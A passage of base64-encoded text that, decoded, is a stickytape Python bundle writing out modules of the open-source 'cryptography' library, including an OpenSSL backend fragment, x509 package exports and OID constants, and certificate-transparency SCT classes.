jb2RpbmcgaXMgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5QRU06XHJcbiAgICAgICAgICAgIHJlcyA9IHNlbGYuX2xpYi5QS0NTN19maW5hbChwNywgYmlvLmJpbywgZmluYWxfZmxhZ3MpXHJcbiAgICAgICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgICAgIHJlcyA9IHNlbGYuX2xpYi5QRU1fd3JpdGVfYmlvX1BLQ1M3X3N0cmVhbShcclxuICAgICAgICAgICAgICAgIGJpb19vdXQsIHA3LCBiaW8uYmlvLCBmaW5hbF9mbGFnc1xyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgYXNzZXJ0IGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuREVSXHJcbiAgICAgICAgICAgICMgV2UgbmVlZCB0byBjYWxsIGZpbmFsaXplIGhlcmUgYmVjYXVhc2UgaTJkX1BLQ1M3X2JpbyBkb2VzIG5vdFxyXG4gICAgICAgICAgICAjIGZpbmFsaXplLlxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9saWIuUEtDUzdfZmluYWwocDcsIGJpby5iaW8sIGZpbmFsX2ZsYWdzKVxyXG4gICAgICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgICAgICAjIE9wZW5TU0wgMy4wIGxlYXZlcyBhIHJhbmRvbSBiaW8gZXJyb3Igb24gdGhlIHN0YWNrOlxyXG4gICAgICAgICAgICAjIGh0dHBzOi8vZ2l0aHViLmNvbS9vcGVuc3NsL29wZW5zc2wvaXNzdWVzLzE2NjgxXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2xpYi5DUllQVE9HUkFQSFlfT1BFTlNTTF8zMDBfT1JfR1JFQVRFUjpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2NvbnN1bWVfZXJyb3JzKClcclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fbGliLmkyZF9QS0NTN19iaW8oYmlvX291dCwgcDcpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICByZXR1cm4gc2VsZi5fcmVhZF9tZW1fYmlvKGJpb19vdXQpXHJcblxyXG5cclxuY2xhc3MgR2V0Q2lwaGVyQnlOYW1lOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGZtdDogc3RyKTpcclxuICAgICAgICBzZWxmLl9mbXQgPSBmbXRcclxuXHJcbiAgICBkZWYgX19jYWxsX18oc2VsZiwgYmFja2VuZDogQmFja2VuZCwgY2lwaGVyOiBDaXBoZXJBbGdvcml0aG0sIG1vZGU6IE1vZGUpOlxyXG4gICAgICAgIGNpcGhlcl9uYW1lID0gc2VsZi5fZm10LmZvcm1hdChjaXBoZXI9Y2lwaGVyLCBtb2RlPW1vZGUpLmxvd2VyKClcclxuICAgICAgICByZXR1cm4gYmFja2VuZC5fbGliLkVWUF9nZXRfY2lwaGVyYnluYW1lKGNpcGhlcl9uYW1lLmVuY29kZSgiYXNjaWkiKSlcclxuXHJcblxyXG5kZWYgX2dldF94dHNfY2lwaGVyKGJhY2tlbmQ6IEJhY2tlbmQsIGNpcGhlcjogQUVTLCBtb2RlKTpcclxuICAgIGNpcGhlcl9uYW1lID0gImFlcy17fS14dHMiLmZvcm1hdChjaXBoZXIua2V5X3NpemUgLy8gMilcclxuICAgIHJldHVybiBiYWNrZW5kLl9saWIuRVZQX2dldF9jaXBoZXJieW5hbWUoY2lwaGVyX25hbWUuZW5jb2RlKCJhc2NpaSIpKVxyXG5cclxuXHJcbmJhY2tlbmQgPSBCYWNrZW5kKClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS94NTA5L19faW5pdF9fLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lng1MDkgaW1wb3J0IGNlcnRpZmljYXRlX3RyYW5zcGFyZW5jeVxyXG5mcm9tIGNyeXB0b2dyYXBoeS54NTA5LmJhc2UgaW1wb3J0IChcclxuICAgIEF0dHJpYnV0ZSxcclxuICAgIEF0dHJpYnV0ZU5vdEZvdW5kLFxyXG4gICAgQXR0cmlidXRlcyxcclxuICAgIENlcnRpZmljYXRlLFxyXG4gICAgQ2VydGlmaWNhdGVCdWlsZGVyLFxyXG4gICAgQ2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdCxcclxuICAgIENlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3RCdWlsZGVyLFxyXG4gICAgQ2VydGlmaWNhdGVTaWduaW5nUmVxdWVzdCxcclxuICAgIENlcnRpZmljYXRlU2lnbmluZ1JlcXVlc3RCdWlsZGVyLFxyXG4gICAgSW52YWxpZFZlcnNpb24sXHJcbiAgICBSZXZva2VkQ2VydGlmaWNhdGUsXHJcbiAgICBSZXZva2VkQ2VydGlmaWNhdGVCdWlsZGVyLFxyXG4gICAgVmVyc2lvbixcclxuICAgIGxvYWRfZGVyX3g1MDlfY2VydGlmaWNhdGUsXHJcbiAgICBsb2FkX2Rlcl94NTA5X2NybCxcclxuICAgIGxvYWRfZGVyX3g1MDlfY3NyLFxyXG4gICAgbG9hZF9wZW1feDUwOV9jZXJ0aWZpY2F0ZSxcclxuICAgIGxvYWRfcGVtX3g1MDlfY3JsLFxyXG4gICAgbG9hZF9wZW1feDUwOV9jc3IsXHJcbiAgICByYW5kb21fc2VyaWFsX251bWJlcixcclxuKVxyXG5mcm9tIGNyeXB0b2dyYXBoeS54NTA5LmV4dGVuc2lvbnMgaW1wb3J0IChcclxuICAgIEFjY2Vzc0Rlc2NyaXB0aW9uLFxyXG4gICAgQXV0aG9yaXR5SW5mb3JtYXRpb25BY2Nlc3MsXHJcbiAgICBBdXRob3JpdHlLZXlJZGVudGlmaWVyLFxyXG4gICAgQmFzaWNDb25zdHJhaW50cyxcclxuICAgIENSTERpc3RyaWJ1dGlvblBvaW50cyxcclxuICAgIENSTE51bWJlcixcclxuICAgIENSTFJlYXNvbixcclxuICAgIENlcnRpZmljYXRlSXNzdWVyLFxyXG4gICAgQ2VydGlmaWNhdGVQb2xpY2llcyxcclxuICAgIERlbHRhQ1JMSW5kaWNhdG9yLFxyXG4gICAgRGlzdHJpYnV0aW9uUG9pbnQsXHJcbiAgICBEdXBsaWNhdGVFeHRlbnNpb24sXHJcbiAgICBFeHRlbmRlZEtleVVzYWdlLFxyXG4gICAgRXh0ZW5zaW9uLFxyXG4gICAgRXh0ZW5zaW9uTm90Rm91bmQsXHJcbiAgICBFeHRlbnNpb25UeXBlLFxyXG4gICAgRXh0ZW5zaW9ucyxcclxuICAgIEZyZXNoZXN0Q1JMLFxyXG4gICAgR2VuZXJhbE5hbWVzLFxyXG4gICAgSW5oaWJpdEFueVBvbGljeSxcclxuICAgIEludmFsaWRpdHlEYXRlLFxyXG4gICAgSXNzdWVyQWx0ZXJuYXRpdmVOYW1lLFxyXG4gICAgSXNzdWluZ0Rpc3RyaWJ1dGlvblBvaW50LFxyXG4gICAgS2V5VXNhZ2UsXHJcbiAgICBOYW1lQ29uc3RyYWludHMsXHJcbiAgICBOb3RpY2VSZWZlcmVuY2UsXHJcbiAgICBPQ1NQTm9DaGVjayxcclxuICAgIE9DU1BOb25jZSxcclxuICAgIFBvbGljeUNvbnN0cmFpbnRzLFxyXG4gICAgUG9saWN5SW5mb3JtYXRpb24sXHJcbiAgICBQcmVjZXJ0UG9pc29uLFxyXG4gICAgUHJlY2VydGlmaWNhdGVTaWduZWRDZXJ0aWZpY2F0ZVRpbWVzdGFtcHMsXHJcbiAgICBSZWFzb25GbGFncyxcclxuICAgIFNpZ25lZENlcnRpZmljYXRlVGltZXN0YW1wcyxcclxuICAgIFN1YmplY3RBbHRlcm5hdGl2ZU5hbWUsXHJcbiAgICBTdWJqZWN0SW5mb3JtYXRpb25BY2Nlc3MsXHJcbiAgICBTdWJqZWN0S2V5SWRlbnRpZmllcixcclxuICAgIFRMU0ZlYXR1cmUsXHJcbiAgICBUTFNGZWF0dXJlVHlwZSxcclxuICAgIFVucmVjb2duaXplZEV4dGVuc2lvbixcclxuICAgIFVzZXJOb3RpY2UsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkueDUwOS5nZW5lcmFsX25hbWUgaW1wb3J0IChcclxuICAgIEROU05hbWUsXHJcbiAgICBEaXJlY3RvcnlOYW1lLFxyXG4gICAgR2VuZXJhbE5hbWUsXHJcbiAgICBJUEFkZHJlc3MsXHJcbiAgICBPdGhlck5hbWUsXHJcbiAgICBSRkM4MjJOYW1lLFxyXG4gICAgUmVnaXN0ZXJlZElELFxyXG4gICAgVW5pZm9ybVJlc291cmNlSWRlbnRpZmllcixcclxuICAgIFVuc3VwcG9ydGVkR2VuZXJhbE5hbWVUeXBlLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lng1MDkubmFtZSBpbXBvcnQgKFxyXG4gICAgTmFtZSxcclxuICAgIE5hbWVBdHRyaWJ1dGUsXHJcbiAgICBSZWxhdGl2ZURpc3Rpbmd1aXNoZWROYW1lLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lng1MDkub2lkIGltcG9ydCAoXHJcbiAgICBBdXRob3JpdHlJbmZvcm1hdGlvbkFjY2Vzc09JRCxcclxuICAgIENSTEVudHJ5RXh0ZW5zaW9uT0lELFxyXG4gICAgQ2VydGlmaWNhdGVQb2xpY2llc09JRCxcclxuICAgIEV4dGVuZGVkS2V5VXNhZ2VPSUQsXHJcbiAgICBFeHRlbnNpb25PSUQsXHJcbiAgICBOYW1lT0lELFxyXG4gICAgT2JqZWN0SWRlbnRpZmllcixcclxuICAgIFNpZ25hdHVyZUFsZ29yaXRobU9JRCxcclxuKVxyXG5cclxuXHJcbk9JRF9BVVRIT1JJVFlfSU5GT1JNQVRJT05fQUNDRVNTID0gRXh0ZW5zaW9uT0lELkFVVEhPUklUWV9JTkZPUk1BVElPTl9BQ0NFU1NcclxuT0lEX0FVVEhPUklUWV9LRVlfSURFTlRJRklFUiA9IEV4dGVuc2lvbk9JRC5BVVRIT1JJVFlfS0VZX0lERU5USUZJRVJcclxuT0lEX0JBU0lDX0NPTlNUUkFJTlRTID0gRXh0ZW5zaW9uT0lELkJBU0lDX0NPTlNUUkFJTlRTXHJcbk9JRF9DRVJUSUZJQ0FURV9QT0xJQ0lFUyA9IEV4dGVuc2lvbk9JRC5DRVJUSUZJQ0FURV9QT0xJQ0lFU1xyXG5PSURfQ1JMX0RJU1RSSUJVVElPTl9QT0lOVFMgPSBFeHRlbnNpb25PSUQuQ1JMX0RJU1RSSUJVVElPTl9QT0lOVFNcclxuT0lEX0VYVEVOREVEX0tFWV9VU0FHRSA9IEV4dGVuc2lvbk9JRC5FWFRFTkRFRF9LRVlfVVNBR0VcclxuT0lEX0ZSRVNIRVNUX0NSTCA9IEV4dGVuc2lvbk9JRC5GUkVTSEVTVF9DUkxcclxuT0lEX0lOSElCSVRfQU5ZX1BPTElDWSA9IEV4dGVuc2lvbk9JRC5JTkhJQklUX0FOWV9QT0xJQ1lcclxuT0lEX0lTU1VFUl9BTFRFUk5BVElWRV9OQU1FID0gRXh0ZW5zaW9uT0lELklTU1VFUl9BTFRFUk5BVElWRV9OQU1FXHJcbk9JRF9LRVlfVVNBR0UgPSBFeHRlbnNpb25PSUQuS0VZX1VTQUdFXHJcbk9JRF9OQU1FX0NPTlNUUkFJTlRTID0gRXh0ZW5zaW9uT0lELk5BTUVfQ09OU1RSQUlOVFNcclxuT0lEX09DU1BfTk9fQ0hFQ0sgPSBFeHRlbnNpb25PSUQuT0NTUF9OT19DSEVDS1xyXG5PSURfUE9MSUNZX0NPTlNUUkFJTlRTID0gRXh0ZW5zaW9uT0lELlBPTElDWV9DT05TVFJBSU5UU1xyXG5PSURfUE9MSUNZX01BUFBJTkdTID0gRXh0ZW5zaW9uT0lELlBPTElDWV9NQVBQSU5HU1xyXG5PSURfU1VCSkVDVF9BTFRFUk5BVElWRV9OQU1FID0gRXh0ZW5zaW9uT0lELlNVQkpFQ1RfQUxURVJOQVRJVkVfTkFNRVxyXG5PSURfU1VCSkVDVF9ESVJFQ1RPUllfQVRUUklCVVRFUyA9IEV4dGVuc2lvbk9JRC5TVUJKRUNUX0RJUkVDVE9SWV9BVFRSSUJVVEVTXHJcbk9JRF9TVUJKRUNUX0lORk9STUFUSU9OX0FDQ0VTUyA9IEV4dGVuc2lvbk9JRC5TVUJKRUNUX0lORk9STUFUSU9OX0FDQ0VTU1xyXG5PSURfU1VCSkVDVF9LRVlfSURFTlRJRklFUiA9IEV4dGVuc2lvbk9JRC5TVUJKRUNUX0tFWV9JREVOVElGSUVSXHJcblxyXG5PSURfRFNBX1dJVEhfU0hBMSA9IFNpZ25hdHVyZUFsZ29yaXRobU9JRC5EU0FfV0lUSF9TSEExXHJcbk9JRF9EU0FfV0lUSF9TSEEyMjQgPSBTaWduYXR1cmVBbGdvcml0aG1PSUQuRFNBX1dJVEhfU0hBMjI0XHJcbk9JRF9EU0FfV0lUSF9TSEEyNTYgPSBTaWduYXR1cmVBbGdvcml0aG1PSUQuRFNBX1dJVEhfU0hBMjU2XHJcbk9JRF9FQ0RTQV9XSVRIX1NIQTEgPSBTaWduYXR1cmVBbGdvcml0aG1PSUQuRUNEU0FfV0lUSF9TSEExXHJcbk9JRF9FQ0RTQV9XSVRIX1NIQTIyNCA9IFNpZ25hdHVyZUFsZ29yaXRobU9JRC5FQ0RTQV9XSVRIX1NIQTIyNFxyXG5PSURfRUNEU0FfV0lUSF9TSEEyNTYgPSBTaWduYXR1cmVBbGdvcml0aG1PSUQuRUNEU0FfV0lUSF9TSEEyNTZcclxuT0lEX0VDRFNBX1dJVEhfU0hBMzg0ID0gU2lnbmF0dXJlQWxnb3JpdGhtT0lELkVDRFNBX1dJVEhfU0hBMzg0XHJcbk9JRF9FQ0RTQV9XSVRIX1NIQTUxMiA9IFNpZ25hdHVyZUFsZ29yaXRobU9JRC5FQ0RTQV9XSVRIX1NIQTUxMlxyXG5PSURfUlNBX1dJVEhfTUQ1ID0gU2lnbmF0dXJlQWxnb3JpdGhtT0lELlJTQV9XSVRIX01ENVxyXG5PSURfUlNBX1dJVEhfU0hBMSA9IFNpZ25hdHVyZUFsZ29yaXRobU9JRC5SU0FfV0lUSF9TSEExXHJcbk9JRF9SU0FfV0lUSF9TSEEyMjQgPSBTaWduYXR1cmVBbGdvcml0aG1PSUQuUlNBX1dJVEhfU0hBMjI0XHJcbk9JRF9SU0FfV0lUSF9TSEEyNTYgPSBTaWduYXR1cmVBbGdvcml0aG1PSUQuUlNBX1dJVEhfU0hBMjU2XHJcbk9JRF9SU0FfV0lUSF9TSEEzODQgPSBTaWduYXR1cmVBbGdvcml0aG1PSUQuUlNBX1dJVEhfU0hBMzg0XHJcbk9JRF9SU0FfV0lUSF9TSEE1MTIgPSBTaWduYXR1cmVBbGdvcml0aG1PSUQuUlNBX1dJVEhfU0hBNTEyXHJcbk9JRF9SU0FTU0FfUFNTID0gU2lnbmF0dXJlQWxnb3JpdGhtT0lELlJTQVNTQV9QU1NcclxuXHJcbk9JRF9DT01NT05fTkFNRSA9IE5hbWVPSUQuQ09NTU9OX05BTUVcclxuT0lEX0NPVU5UUllfTkFNRSA9IE5hbWVPSUQuQ09VTlRSWV9OQU1FXHJcbk9JRF9ET01BSU5fQ09NUE9ORU5UID0gTmFtZU9JRC5ET01BSU5fQ09NUE9ORU5UXHJcbk9JRF9ETl9RVUFMSUZJRVIgPSBOYW1lT0lELkROX1FVQUxJRklFUlxyXG5PSURfRU1BSUxfQUREUkVTUyA9IE5hbWVPSUQuRU1BSUxfQUREUkVTU1xyXG5PSURfR0VORVJBVElPTl9RVUFMSUZJRVIgPSBOYW1lT0lELkdFTkVSQVRJT05fUVVBTElGSUVSXHJcbk9JRF9HSVZFTl9OQU1FID0gTmFtZU9JRC5HSVZFTl9OQU1FXHJcbk9JRF9MT0NBTElUWV9OQU1FID0gTmFtZU9JRC5MT0NBTElUWV9OQU1FXHJcbk9JRF9PUkdBTklaQVRJT05BTF9VTklUX05BTUUgPSBOYW1lT0lELk9SR0FOSVpBVElPTkFMX1VOSVRfTkFNRVxyXG5PSURfT1JHQU5JWkFUSU9OX05BTUUgPSBOYW1lT0lELk9SR0FOSVpBVElPTl9OQU1FXHJcbk9JRF9QU0VVRE9OWU0gPSBOYW1lT0lELlBTRVVET05ZTVxyXG5PSURfU0VSSUFMX05VTUJFUiA9IE5hbWVPSUQuU0VSSUFMX05VTUJFUlxyXG5PSURfU1RBVEVfT1JfUFJPVklOQ0VfTkFNRSA9IE5hbWVPSUQuU1RBVEVfT1JfUFJPVklOQ0VfTkFNRVxyXG5PSURfU1VSTkFNRSA9IE5hbWVPSUQuU1VSTkFNRVxyXG5PSURfVElUTEUgPSBOYW1lT0lELlRJVExFXHJcblxyXG5PSURfQ0xJRU5UX0FVVEggPSBFeHRlbmRlZEtleVVzYWdlT0lELkNMSUVOVF9BVVRIXHJcbk9JRF9DT0RFX1NJR05JTkcgPSBFeHRlbmRlZEtleVVzYWdlT0lELkNPREVfU0lHTklOR1xyXG5PSURfRU1BSUxfUFJPVEVDVElPTiA9IEV4dGVuZGVkS2V5VXNhZ2VPSUQuRU1BSUxfUFJPVEVDVElPTlxyXG5PSURfT0NTUF9TSUdOSU5HID0gRXh0ZW5kZWRLZXlVc2FnZU9JRC5PQ1NQX1NJR05JTkdcclxuT0lEX1NFUlZFUl9BVVRIID0gRXh0ZW5kZWRLZXlVc2FnZU9JRC5TRVJWRVJfQVVUSFxyXG5PSURfVElNRV9TVEFNUElORyA9IEV4dGVuZGVkS2V5VXNhZ2VPSUQuVElNRV9TVEFNUElOR1xyXG5cclxuT0lEX0FOWV9QT0xJQ1kgPSBDZXJ0aWZpY2F0ZVBvbGljaWVzT0lELkFOWV9QT0xJQ1lcclxuT0lEX0NQU19RVUFMSUZJRVIgPSBDZXJ0aWZpY2F0ZVBvbGljaWVzT0lELkNQU19RVUFMSUZJRVJcclxuT0lEX0NQU19VU0VSX05PVElDRSA9IENlcnRpZmljYXRlUG9saWNpZXNPSUQuQ1BTX1VTRVJfTk9USUNFXHJcblxyXG5PSURfQ0VSVElGSUNBVEVfSVNTVUVSID0gQ1JMRW50cnlFeHRlbnNpb25PSUQuQ0VSVElGSUNBVEVfSVNTVUVSXHJcbk9JRF9DUkxfUkVBU09OID0gQ1JMRW50cnlFeHRlbnNpb25PSUQuQ1JMX1JFQVNPTlxyXG5PSURfSU5WQUxJRElUWV9EQVRFID0gQ1JMRW50cnlFeHRlbnNpb25PSUQuSU5WQUxJRElUWV9EQVRFXHJcblxyXG5PSURfQ0FfSVNTVUVSUyA9IEF1dGhvcml0eUluZm9ybWF0aW9uQWNjZXNzT0lELkNBX0lTU1VFUlNcclxuT0lEX09DU1AgPSBBdXRob3JpdHlJbmZvcm1hdGlvbkFjY2Vzc09JRC5PQ1NQXHJcblxyXG5fX2FsbF9fID0gW1xyXG4gICAgImNlcnRpZmljYXRlX3RyYW5zcGFyZW5jeSIsXHJcbiAgICAibG9hZF9wZW1feDUwOV9jZXJ0aWZpY2F0ZSIsXHJcbiAgICAibG9hZF9kZXJfeDUwOV9jZXJ0aWZpY2F0ZSIsXHJcbiAgICAibG9hZF9wZW1feDUwOV9jc3IiLFxyXG4gICAgImxvYWRfZGVyX3g1MDlfY3NyIixcclxuICAgICJsb2FkX3BlbV94NTA5X2NybCIsXHJcbiAgICAibG9hZF9kZXJfeDUwOV9jcmwiLFxyXG4gICAgInJhbmRvbV9zZXJpYWxfbnVtYmVyIixcclxuICAgICJBdHRyaWJ1dGUiLFxyXG4gICAgIkF0dHJpYnV0ZU5vdEZvdW5kIixcclxuICAgICJBdHRyaWJ1dGVzIixcclxuICAgICJJbnZhbGlkVmVyc2lvbiIsXHJcbiAgICAiRGVsdGFDUkxJbmRpY2F0b3IiLFxyXG4gICAgIkR1cGxpY2F0ZUV4dGVuc2lvbiIsXHJcbiAgICAiRXh0ZW5zaW9uTm90Rm91bmQiLFxyXG4gICAgIlVuc3VwcG9ydGVkR2VuZXJhbE5hbWVUeXBlIixcclxuICAgICJOYW1lQXR0cmlidXRlIixcclxuICAgICJOYW1lIixcclxuICAgICJSZWxhdGl2ZURpc3Rpbmd1aXNoZWROYW1lIixcclxuICAgICJPYmplY3RJZGVudGlmaWVyIixcclxuICAgICJFeHRlbnNpb25UeXBlIixcclxuICAgICJFeHRlbnNpb25zIixcclxuICAgICJFeHRlbnNpb24iLFxyXG4gICAgIkV4dGVuZGVkS2V5VXNhZ2UiLFxyXG4gICAgIkZyZXNoZXN0Q1JMIixcclxuICAgICJJc3N1aW5nRGlzdHJpYnV0aW9uUG9pbnQiLFxyXG4gICAgIlRMU0ZlYXR1cmUiLFxyXG4gICAgIlRMU0ZlYXR1cmVUeXBlIixcclxuICAgICJPQ1NQTm9DaGVjayIsXHJcbiAgICAiQmFzaWNDb25zdHJhaW50cyIsXHJcbiAgICAiQ1JMTnVtYmVyIixcclxuICAgICJLZXlVc2FnZSIsXHJcbiAgICAiQXV0aG9yaXR5SW5mb3JtYXRpb25BY2Nlc3MiLFxyXG4gICAgIlN1YmplY3RJbmZvcm1hdGlvbkFjY2VzcyIsXHJcbiAgICAiQWNjZXNzRGVzY3JpcHRpb24iLFxyXG4gICAgIkNlcnRpZmljYXRlUG9saWNpZXMiLFxyXG4gICAgIlBvbGljeUluZm9ybWF0aW9uIixcclxuICAgICJVc2VyTm90aWNlIixcclxuICAgICJOb3RpY2VSZWZlcmVuY2UiLFxyXG4gICAgIlN1YmplY3RLZXlJZGVudGlmaWVyIixcclxuICAgICJOYW1lQ29uc3RyYWludHMiLFxyXG4gICAgIkNSTERpc3RyaWJ1dGlvblBvaW50cyIsXHJcbiAgICAiRGlzdHJpYnV0aW9uUG9pbnQiLFxyXG4gICAgIlJlYXNvbkZsYWdzIixcclxuICAgICJJbmhpYml0QW55UG9saWN5IixcclxuICAgICJTdWJqZWN0QWx0ZXJuYXRpdmVOYW1lIixcclxuICAgICJJc3N1ZXJBbHRlcm5hdGl2ZU5hbWUiLFxyXG4gICAgIkF1dGhvcml0eUtleUlkZW50aWZpZXIiLFxyXG4gICAgIkdlbmVyYWxOYW1lcyIsXHJcbiAgICAiR2VuZXJhbE5hbWUiLFxyXG4gICAgIlJGQzgyMk5hbWUiLFxyXG4gICAgIkROU05hbWUiLFxyXG4gICAgIlVuaWZvcm1SZXNvdXJjZUlkZW50aWZpZXIiLFxyXG4gICAgIlJlZ2lzdGVyZWRJRCIsXHJcbiAgICAiRGlyZWN0b3J5TmFtZSIsXHJcbiAgICAiSVBBZGRyZXNzIixcclxuICAgICJPdGhlck5hbWUiLFxyXG4gICAgIkNlcnRpZmljYXRlIixcclxuICAgICJDZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0IixcclxuICAgICJDZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0QnVpbGRlciIsXHJcbiAgICAiQ2VydGlmaWNhdGVTaWduaW5nUmVxdWVzdCIsXHJcbiAgICAiUmV2b2tlZENlcnRpZmljYXRlIixcclxuICAgICJSZXZva2VkQ2VydGlmaWNhdGVCdWlsZGVyIixcclxuICAgICJDZXJ0aWZpY2F0ZVNpZ25pbmdSZXF1ZXN0QnVpbGRlciIsXHJcbiAgICAiQ2VydGlmaWNhdGVCdWlsZGVyIixcclxuICAgICJWZXJzaW9uIixcclxuICAgICJPSURfQ0FfSVNTVUVSUyIsXHJcbiAgICAiT0lEX09DU1AiLFxyXG4gICAgIkNlcnRpZmljYXRlSXNzdWVyIixcclxuICAgICJDUkxSZWFzb24iLFxyXG4gICAgIkludmFsaWRpdHlEYXRlIixcclxuICAgICJVbnJlY29nbml6ZWRFeHRlbnNpb24iLFxyXG4gICAgIlBvbGljeUNvbnN0cmFpbnRzIixcclxuICAgICJQcmVjZXJ0aWZpY2F0ZVNpZ25lZENlcnRpZmljYXRlVGltZXN0YW1wcyIsXHJcbiAgICAiUHJlY2VydFBvaXNvbiIsXHJcbiAgICAiT0NTUE5vbmNlIixcclxuICAgICJTaWduZWRDZXJ0aWZpY2F0ZVRpbWVzdGFtcHMiLFxyXG4gICAgIlNpZ25hdHVyZUFsZ29yaXRobU9JRCIsXHJcbiAgICAiTmFtZU9JRCIsXHJcbl1cclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS94NTA5L2NlcnRpZmljYXRlX3RyYW5zcGFyZW5jeS5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcblxyXG5pbXBvcnQgYWJjXHJcbmltcG9ydCBkYXRldGltZVxyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iaW5kaW5ncy5fcnVzdCBpbXBvcnQgeDUwOSBhcyBydXN0X3g1MDlcclxuXHJcblxyXG5jbGFzcyBMb2dFbnRyeVR5cGUodXRpbHMuRW51bSk6XHJcbiAgICBYNTA5X0NFUlRJRklDQVRFID0gMFxyXG4gICAgUFJFX0NFUlRJRklDQVRFID0gMVxyXG5cclxuXHJcbmNsYXNzIFZlcnNpb24odXRpbHMuRW51bSk6XHJcbiAgICB2MSA9IDBcclxuXHJcblxyXG5jbGFzcyBTaWduZWRDZXJ0aWZpY2F0ZVRpbWVzdGFtcChtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgdmVyc2lvbihzZWxmKSAtPiBWZXJzaW9uOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIFNDVCB2ZXJzaW9uLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGxvZ19pZChzZWxmKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIGFuIGlkZW50aWZpZXIgaW5kaWNhdGluZyB3aGljaCBsb2cgdGhpcyBTQ1QgaXMgZm9yLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIHRpbWVzdGFtcChzZWxmKSAtPiBkYXRldGltZS5kYXRldGltZTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSB0aW1lc3RhbXAgZm9yIHRoaXMgU0NULlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGVudHJ5X3R5cGUoc2VsZikgLT4gTG9nRW50cnlUeXBlOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgd2hldGhlciB0aGlzIGlzIGFuIFNDVCBmb3IgYSBjZXJ0aWZpY2F0ZSBvciBwcmUtY2VydGlmaWNhdGUuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuU2lnbmVkQ2VydGlmaWNhdGVUaW1lc3RhbXAucmVnaXN0ZXIocnVzdF94NTA5LlNjdClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvYmluZGluZ3MvX19pbml0X18ucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkveDUwOS9iYXNlLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuXHJcbmltcG9ydCBhYmN